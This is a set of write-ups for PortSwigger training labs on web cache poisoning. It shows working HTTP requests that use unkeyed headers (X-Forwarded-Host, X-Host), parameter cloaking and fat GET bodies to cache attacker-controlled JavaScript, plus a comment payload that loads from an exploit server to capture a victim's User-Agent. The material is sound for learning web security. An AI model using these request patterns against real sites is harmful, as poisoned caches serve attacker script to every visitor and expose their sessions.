01 Web cache poisoning with an unkeyed header
=============================================

This lab is vulnerable to web cache poisoning because it handles input from an
unkeyed header in an unsafe way. An unsuspecting user regularly visits the
site's home page. To solve this lab, poison the cache with a response that
executes alert(document.cookie) in the visitor's browser.

Hint: This lab supports the X-Forwarded-Host header.

References:

-   https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws

![img](media/eb69d9dec793fcdddb72817902350ca7.png)

There is a reference to the file /resources/js/tracking.js in the home page:

![img](media/f19a82e2267dc54ea614d4343eb93c15.png)

It contains this code:

![img](media/156d08588d49eb98975c636722af9002.png)

I will create a similar one in the exploit server with the payload we want:

![img](media/96b135727872225ddd8831477563af32.png)

Then I will send the exploit server url in the X-Forwarded-Host header to the
home page:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
GET / HTTP/2
...
X-Forwarded-Host: exploit-0a26003703122ceb80d4074501290007.exploit-server.net
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/780299e8115295cb412f7f461bb4ea18.png)

When accessing the home page we get the alert pop up:

![img](media/6bc09ef0499aeb83d680e5c6ee04b825.png)

03 Web cache poisoning with multiple headers
============================================

This lab contains a web cache poisoning vulnerability that is only exploitable
when you use multiple headers to craft a malicious request. A user visits the
home page roughly once a minute. To solve this lab, poison the cache with a
response that executes alert(document.cookie) in the visitor's browser.

Hint: This lab supports both the X-Forwarded-Host and X-Forwarded-Scheme
headers.

References:

-   https://portswigger.net/web-security/web-cache-poisoning

-   https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws

![img](media/d1f4aa4dd0ea6e05914f7478001dce08.png)

![img](media/f3b9416f654e404f0e4097075514463d.png)

Generated link:
https://0ae800d80308055d8643c5240076001f.web-security-academy.net/

Using Parm Miner we identify an unlinked parameter:

![img](media/a22504dacdda5920e324ff4715bb9300.png)

It seems there is a problem with jpg extension:

![img](media/64a19e5fb327bab5c0de7ecb24455176.png)

If we add this header to our request and send it many times, it ends up
generating a 302 redirection return code:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
X-Forwarded-Scheme: http
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/da5eab0adff7b2c4e8bf7339627ef305.png)

If we use both headers X-Forwarded-Host and we find X-Forwarded-Scheme, we find
the location becomes https://127.0.0.1/PATH:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
X-Forwarded-Host: 127.0.0.1
X-Forwarded-Scheme: http
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/3aeecadb7718a15823a53c68bbed6f55.png)

If we change 127.0.0.1 for the exploit server domain name:

![img](media/b7e040272d8e28505e1ed22e1e665c19.png)

We get a redirection after some requests:

![img](media/db145a2787765d8647fb04658457ff10.png)

And the response to the redirection contains whatever we host in /bbbbbb in the
exploit server:

![img](media/c07c63c74ae95e229527655f8f60d264.png)

There are two imported Javascript scripts in the page:

![img](media/f38495e8a99e644af02f8f45ea766b01.png)

To solve this we must host a file in that path in the exploit server:

![img](media/3a584ed3d967a7c7bd6d03a641066e5e.png)

First the request will have the normal response:

![img](media/32bdc88fa97aae7e60f43d9dd7595f4b.png)

This is the default file:

![img](media/ce827b8fa484dadd4683cffe10e1d647.png)

After hitting the cache limit there is a redirection:

![img](media/d5d17014e63a4b0bd49cc1f6f1390258.png)

This redirection takes to the exploit server hosted file:

![img](media/4e840a33078054fc69819d38ae2569c9.png)

There is an alert message if accessing the page:

![img](media/189bffcedbc524cfc4a0739720b332de.png)

04 Targeted web cache poisoning using an unknown header
=======================================================

This lab is vulnerable to web cache poisoning. A victim user will view any
comments that you post. To solve this lab, you need to poison the cache with a
response that executes alert(document.cookie) in the visitor's browser. However,
you also need to make sure that the response is served to the specific subset of
users to which the intended victim belongs.

References:

-   https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws

![img](media/a169dc4db619d3635667f612673b891f.png)

We get the “Vary” header in the response to “/post/comment?postId=2”:

![img](media/f7b39c9c23fc682c20273cd55a261ae7.png)

There are 4 imported scripts, the only one containing the full url is
tracking.js:

![img](media/5b65e748b1b571d8e6ed4b152b547374.png)

![img](media/a47c5bc4f5113893e28b2dc44ff4e2b0.png)

We will launch Param Miner as X-Forwarded-Host and X-Forwarded-Scheme headers do
not seem to work:

![img](media/57ed6b346a9ce1cd829df2b8c366a113.png)

It detects two secret headers, Origin and X-Host:

![img](media/ed75bc2d521fe4c7321a88df830be4a2.png)

![img](media/d1e5359292e3346e2ede8e0071ce1851.png)

If we send these headers with the exploit server hostname, we see the hostname
gets reflected (the one working is X-Host):

![img](media/ad61a0ff9181f6d71f8665f12c6e7805.png)

We will create the Javascript payload in the exploit server:

![img](media/1ae6ceec17db5acfb07198a0e64080b3.png)

Then send the request to Intruder and use the list of User-Agents:

![img](media/93524f074e4cf396ad4f65d3139c255d.png)

![img](media/695ee84b1ac5c63ed8639016df835fe6.png)

However this approach provokes the server to go down:

![img](media/3fb1d1fe085a6a73d84d685cffa9138c.png)

We will create a comment with this payload:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
< src="https://exploit-0acc00f704141c10817b1b2e011000d5.exploit-server.net/foo" />
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

We get the User-Agent “Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like
Gecko) Chrome/113.0.0.0 Safari/537.36”:

![img](media/1588cfcb28ba1ad590d4462a897e3428.png)

And finally:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
GET / HTTP/1.1
...
User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
X-Host: exploit-0acc00f704141c10817b1b2e011000d5.exploit-server.net
...
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/4133d8eb4822df1ff09623d3c3c05d6b.png)

07 Parameter cloaking
=====================

This lab is vulnerable to web cache poisoning because it excludes a certain
parameter from the cache key. There is also inconsistent parameter parsing
between the cache and the back-end. A user regularly visits this site's home
page using Chrome.

To solve the lab, use the parameter cloaking technique to poison the cache with
a response that executes alert(1) in the victim's browser.

Hint: The website excludes a certain UTM analytics parameter

References:

-   https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws

![img](media/89038b9d14b6c1f55afad6c7e9598f93.png)

![img](media/456f13cb6594046aa22d0302b56d99d0.png)

We can find the “Origin” header can work as oracle and random query parameters
are keyed:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
GET /?test=ing123 HTTP/2
...
Pragma: x-get-cache-key
Accept-Encoding: gzip, deflate, cachebuster
Accept: */*, text/cachebuster
Cookie: cachebuster=1
Origin: https://cachebuster.0afc006103e7279e80ff71c000b0005c.web-security-academy.net
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/1b96d3810b9e9385813ee7ae4cb4a23c.png)

We will try to guess GET parameters with Param Miner:

![img](media/290b82fac10e29d6a209452a5124e91b.png)

It detects the same parameter as the previous lab, “utm_content”, and the
Parameter Cloaking problem:

![img](media/540c3dcc937c24b1135505b857e7ad31.png)

![img](media/0c680a690ba4e433e91d62564328550a.png)

The parameter value is reflected in the response and is not part of the
“X-Cache-Key” response header:

![img](media/79441adc029603909ba327bbbaac5fcb.png)

Hoerver we can not execute an alert(1) payload as earlier because the parameter
value gets HTML-encoded:

![img](media/ee5dbdd115ad439c1d45c14866ee99e9.png)

With a payload we see how the cookie is set to “TEST456”, so there is parameter
cloaking:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
GET /?utm_content=TEST123;utm_content=TEST456 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/56da3dd782ae15967133c3d2d75bf430.png)

There is a callback using the cookie to set the country:

![img](media/0960b8d4e9fc0e6f127ea09f19d43348.png)

We can access this script with the parameter “callback” -
https://0aeb0036048afd8e80b649b70032005e.web-security-academy.net/js/geolocate.js?callback=alert(1):

![img](media/02dc2c44503bc721b00dcb1b258d0186.png)

We will poison the request “/js/geolocate.js?callback=setCountryCookie”, which
is an endpoint requested from the home page. For that first with the payload and
the “Origin” header:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
GET /?keyed_param=abc&excluded_param=123;keyed_param=bad-stuff-here
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1) HTTP/2
...
Pragma: x-get-cache-key
Origin: https://cachebuster.0afc006103e7279e80ff71c000b0005c.web-security-academy.net
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/0d6d21a8c4bc412c788a7adc49dd5469.png)

The keyed part was “/js/geolocate.js?callback=setCountryCookie” but the last
value for “callback” was “alert(1)” so it got poisoned:

![img](media/149b708d6d877268a50c68a955584f5a.png)

Then accessing “/”, we do not see the alert(1) but we see the poisoned request:

![img](media/dadfc1f2cec02855b1f915969cc50055.png)

Then the request is poisoned without the “Origin” header:

![img](media/33a887f2cf8f9325f76bbfa2998ca1a4.png)

And then access “/”:

![img](media/b3b15e86155e6fdb87610ffff48e9236.png)

![img](media/910f184d0bc8d8a17501ee64d7a7cb20.png)

08 Web cache poisoning via a fat GET request
============================================

This lab is vulnerable to web cache poisoning. It accepts GET requests that have
a body, but does not include the body in the cache key. A user regularly visits
this site's home page using Chrome.

To solve the lab, poison the cache with a response that executes alert(1) in the
victim's browser.

References:

-   https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws

![img](media/dfef94730939ba74fab5e0135863b18b.png)

We can find the “Origin” header can work as oracle and random query parameters
are keyed:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
GET /?test=ing123 HTTP/2
...
Pragma: x-get-cache-key
Accept-Encoding: gzip, deflate, cachebuster
Accept: */*, text/cachebuster
Cookie: cachebuster=1
Origin: https://cachebuster.0afc006103e7279e80ff71c000b0005c.web-security-academy.net
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/bf45ec407c01127b523991ab00396c4d.png)

Just like the previous lab, we find a request to
“/js/geolocate.js?callback=setCountryCookie” from the home page:

![img](media/e8758bbb1c48d38fefe4957d70e0029a.png)

First we will send the payload with the “Origin” header. We have to add the
“X-Http-Method-Override” header so the “alert(1)” gets cached:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
GET /js/geolocate.js?callback=setCountryCookie HTTP/2
...
Origin: https://cachebuster.0afc006103e7279e80ff71c000b0005c.web-security-academy.net
X-Http-Method-Override: POST
Content-Length: 17

callback=alert(1)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/cf61caaf9344fced9c0ce396b99aeb80.png)

Then we check with the “Origin” header and a regular GET request:

![img](media/67b5e97ca6ce87d8b894f8df4c85c49c.png)

Then we poison the endpoint without the “Origin” header:

![img](media/49ce60313e637858565eba49d5743aa4.png)

And check with a regular GET request without the “Origin” header:

![img](media/9cf70be0b6523fd87df0d3beeae93b7a.png)

Then access “/” and the request to this endpoint generates the alert message:

![img](media/2c80327e1c1382c41933c63472f95280.png)
